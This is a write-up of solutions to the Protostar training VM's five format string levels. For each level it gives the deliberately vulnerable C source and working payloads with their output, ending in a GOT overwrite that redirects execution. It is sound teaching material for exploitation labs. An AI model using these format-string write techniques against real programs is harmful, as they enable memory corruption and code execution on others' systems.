+++
categories = ["ctf", "linux"]
date = "2016-06-26T03:10:18-04:00"
description = ""
keywords = ["Protostar", "exploit", "ctf", "format string"]
title = "Protostar Format String (Levels 0-4)"

+++

Protostar is a Linux VM with a series of exploitation exercises. It has five sections: stack overflows, format strings, heap overflows, 
network code and 3 final levels with combinations of all the above.

This post contains solutions for the five format string levels. 

<!--more-->

### Format0

> This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

> Hints

> - This level should be done in less than 10 bytes of input.
> - “Exploiting format string vulnerabilities”

> This level is at /opt/protostar/bin/format0

#### Source Code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

The `sprintf` function in the code above has both buffer overflow and format string vulnerabilities. 
A standard buffer overflow would look like this (overwriting the target in the process):

```
user@protostar:/opt/protostar/bin$ ./format0 `python -c "print 'A'*64 + '\xef\xbe\xad\xde'"`
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$ 
```

However, this method uses 68 bytes of input. The 64 "A"'s can be replaced with a format string which has a specific width field `%64x`. 
Now the exploit looks like this: 

```
user@protostar:/opt/protostar/bin$ ./format0 `python -c "print '%64x\xef\xbe\xad\xde'"`
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$
```

This method uses 8 bytes of input.

### Format1

> This level shows how format strings can be used to modify arbitrary memory locations.

> Hints

> - objdump -t is your friend, and your input string lies far up the stack :)

> This level is at /opt/protostar/bin/format1

#### Source Code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

In this level we have to overwrite a global variable `target` with any value. First we need to find the address of our input on the stack. 
We can use a piece of string that is easy to look for (like "AAAAAAAA") and dump a piece of the stack with `%x` format strings:

```
user@protostar:/opt/protostar/bin$ ./format1 `python -c "print 'AAAAAAAA' + '%x.'*200"`
```

Once we are able to identify our input (41414141) in this hex dump, we can try to adjust the payload to hit a precise possition:

```
user@protostar:/opt/protostar/bin$ ./format1 `python -c "print 'AAAAAAAA' + '%x.'*128"`
AAAAAAAA804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff831.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.105f6e4e.3a0bf85e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff827.bffff831.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.43000000.c717d6c1.3b98f7d9.5d2de33f.697bf342.363836.0.2e000000.726f662f.3174616d.41414100
```

As we can see our input does not align properly, so we have to pad it a little bit. 
We can adjust the payload and stick a single `%x` to the end to see if we got it right:

```
user@protostar:/opt/protostar/bin$ ./format1 `python -c "print 'AAAAAAAA00' + '%x.'*127"`%x
AAAAAAAA00804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.947fee7e.be2b786e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.6b000000.87c2a0a8.f580b5c9.a30e6569.69f7f8e0.363836.0.2f2e0000.6d726f66.317461.41414141
```

Now that we have the correct position we need to replace the "A"'s with the address of our `target` variable. 
We can find it with the objdump command:

```
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ 
```

After we insert our address (little endian) we can also replace the last `%x` with the `%n`. This modifier writes to the specified address instead of displaying the contents. Now we can pass this level:

```
user@protostar:/opt/protostar/bin$ ./format1 `python -c "print '\x38\x96\x04\x08AAAA00' + '%x.'*127"`%n
8�AAAA00804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.aaa339a8.80f7afb8.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.b8000000.ecbb7eda.506baaa7.48d611bb.69d839a6.363836.0.2f2e0000.6d726f66.317461.you have modified the target :)
``` 

### Format2

> This level moves on from format1 and shows how specific values can be written in memory.

> This level is at /opt/protostar/bin/format2

#### Source Code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

This level builds on the previous level by requiring to overwrite the `target` with a specific value (decimal 64). 
Similarly to the previous level we need to find our input on the stack. This time, however, the input is being read from stdin instead of being passed as an argument.
Also the payload is a lot closer to the top of the stack:

```
user@protostar:/opt/protostar/bin$ echo `python -c "print 'AAAAAAAA' + '%x.'*5"` | ./format2
AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.
target is 0 :(
user@protostar:/opt/protostar/bin$ 
```

Similarly, we find the address of the `target` variable and test if we can precisely display and overwrite the address:

```
user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ echo `python -c "print 'AAAA\xe4\x96\x04\x08' + '%x.'*4"`%x | ./format2
AAAA��200.b7fd8420.bffff624.41414141.80496e4
target is 0 :(
user@protostar:/opt/protostar/bin$ echo `python -c "print 'AAAA\xe4\x96\x04\x08' + '%x.'*4"`%n | ./format2
AAAA��200.b7fd8420.bffff624.41414141.
target is 39 :(
user@protostar:/opt/protostar/bin$ 
```

Now we can adjust the payload a little bit to overwrite the target with exact value of 64. First we change the "'%x.'*4" to "%x%x%x%x" and then we can adjust
the width of one of the `%x` modifiers to hit the precise byte value:

```
user@protostar:/opt/protostar/bin$ echo `python -c "print 'AAAA\xe4\x96\x04\x08' + '%x%x%x%x'"`%n | ./format2
AAAA��200b7fd8420bffff62441414141
target is 35 :(
user@protostar:/opt/protostar/bin$ echo `python -c "print 'AAAA\xe4\x96\x04\x08' + '%32x%x%x%x'"`%n | ./format2
AAAA��                             200b7fd8420bffff62441414141
you have modified the target :)
user@protostar:/opt/protostar/bin$ 
```

### Format3

> This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.

> This level is at /opt/protostar/bin/format3

#### Source Code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

This level advances from format2 and requires us to write a specific 4 byte value into the `target` memory address. 
First we find the exact address of the `target` variable:
 
```
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ 
```

We can write the full 4 byte value `0x01025544` using four writes. If we shift the address each time by one byte we should be able to effectively write 
1 byte into target address with each write. The whole process of overwriting the target address should roughly look like this:

```
Memory Address	
0x080496f4        44 00 00 00
0x080496f5           55 00 00 00 
0x080496f6              02 00 00 00
0x080496f7                 01 00 00 00
		  44 55 02 01	
```

To further simplify the process of multiple writes we can use a technique called "Direct Parameter Access" (DPA). It allows to directly address a stack
parameter from within the format string. The DPA is controlled by the "$" qualifier. For example:

```
printf ("%6$d\n", 6, 5, 4, 3, 2, 1);
```

This prints "1", because "6$" explicitly addresses the 6th parameter on the stack.

In our case, the input lies as the 12th parameter on the stack:

```
user@protostar:/opt/protostar/bin$ echo AAAA%12\$x | ./format3
AAAA41414141
target is 00000000 :(
```

Now we can start overwriting the target memory by writing into four consecutive addresses and addressing them as `$12`, `$13`, `$14` and `$15` using the DPA:

```
user@protostar:/opt/protostar/bin$ echo `python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08'"`%12\$n%13\$n%14$\n%15\$n | ./format3
��������
target is 10101010 :(
```

We have overwritten the target with `0x10`'s (16 - four 4-byte addresses). We can now adjust the values written by using the `%x` width modifiers.
We can use gdb to calculate the exact values:

```
user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0x44 - 0x10
$1 = 52
(gdb) p 0x55 - 0x44
$2 = 17
(gdb) p 0x102 - 0x55
$3 = 173
(gdb) p 0x101 - 0x02
$4 = 255
(gdb) quit
user@protostar:/opt/protostar/bin$ echo `python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08'"`%52x%12\$n%17x%13\$n%173x%14$\n%255x%15\$n | ./format3
��������                                                   0         bffff5e0                                                                                                                                                                     b7fd7ff4                                                                                                                                                                                                                                                              0
you have modified the target :)
user@protostar:/opt/protostar/bin$ 
```

##### Using Short Writes

We can achieve the same effect of writing a full 4-byte value by doing just two write operations. We can use a special write operation which writes 
short int types - the `%hn` parameter. Not only it shortens the exploit string itself, it also prevents a side effect of overwriting additional memory. 
We can refer to the previous chapter and see that with four write method we overwrote additional 3 bytes after the target address with `0x00`. This can 
have side effects if that memory stores important information (such as a pointer to some function).

So using the short write method our exploit looks like this: 

```
user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0x5544 - 8
$1 = 21820
(gdb) p 0x10102 - 0x5544
$2 = 43966
(gdb) quit
user@protostar:/opt/protostar/bin$ echo `python -c "print '\xf4\x96\x04\x08\xf6\x96\x04\x08'"`%21820x%12\$hn%43966x%13\$hn | ./format3
...( HUGE amount of space)...

                                   bffff5e0
you have modified the target :)
```


### Format4

> %p format4 looks at one method of redirecting execution in a process.

> Hints

> - objdump -TR is your friend

> This level is at /opt/protostar/bin/format4

#### Source Code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

In this level we need to alter code execution flow and execute the `hello()` function. 
The easiest method would be to overwrite the `exit()` functions address in the global offset table (GOT) with the address of the `hello()`.
This way when the program tries to exit (after printf) it will execute our code instead.

First we examine the GOT and find the entry for the `exit()` at `0x08049724`:

```
user@protostar:/opt/protostar/bin$ objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000      DF *UND*	00000000  GLIBC_2.0   exit
080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit

user@protostar:/opt/protostar/bin$ objdump -t format4 | grep hello
080484b4 g     F .text	0000001e              hello
user@protostar:/opt/protostar/bin$ 

```

The address of the `hello` function is `0x080484b4`. So now we need to write this address into the GOT entry for the `exit` function (at `0x08049724`). 
Our input string is the $4 parameter (DPA):

```
user@protostar:/opt/protostar/bin$ echo AAAA`python -c "print '%x.'*20"` | ./format4
AAAA200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.a.
user@protostar:/opt/protostar/bin$ echo AAAA%4\$x | ./format4
AAAA41414141
user@protostar:/opt/protostar/bin$ 
```

Now using the short write method we write a couple of test values first (this makes the program segfault) and later correct them with the help of gdb:

```
user@protostar:/opt/protostar/bin$ echo `python -c "print '\x24\x97\x04\x08\x26\x97\x04\x08'"`%4\$hn%5\$hn | ./format4
$�&�
Segmentation fault
user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0x84b4 - 8
$1 = 33964
(gdb) p 0x10804 - 0x84b4
$2 = 33616
(gdb) quit
user@protostar:/opt/protostar/bin$ echo `python -c "print '\x24\x97\x04\x08\x26\x97\x04\x08'"`%33964x%4\$hn%33616x%5\$hn | ./format4
...( HUGE amount of space)...
                      b7fd8420
code execution redirected! you win
user@protostar:/opt/protostar/bin$ 
```



